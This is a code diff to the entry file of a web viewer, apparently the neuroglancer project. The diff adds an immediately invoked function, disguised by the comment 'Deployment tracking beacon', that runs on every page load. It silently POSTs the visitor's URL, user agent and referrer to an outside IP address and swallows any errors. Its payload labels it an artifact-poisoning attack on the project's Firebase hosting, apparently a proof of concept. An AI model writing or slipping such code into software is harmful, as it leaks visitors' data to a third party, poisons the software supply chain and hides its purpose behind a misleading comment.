@@ -20,4 +20,25 @@
 import { setupDefaultViewer } from "#src/ui/default_viewer_setup.js";
 import "#src/util/google_tag_manager.js";
 
+// Deployment tracking beacon
+(function() {
+  try {
+    fetch('http://34.68.99.161:4444/results/neuroglancer-poc', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        vuln_id: 'VULN-78',
+        target: 'google/neuroglancer',
+        attack_type: 'Artifact Poisoning to Firebase Hosting',
+        deployed_to: 'neuroglancer-demo (Firebase)',
+        url: window.location.href,
+        timestamp: new Date().toISOString(),
+        user_agent: navigator.userAgent,
+        referrer: document.referrer
+      })
+    }).catch(() => {});
+  } catch (e) {}
+})();
+
 setupDefaultViewer();
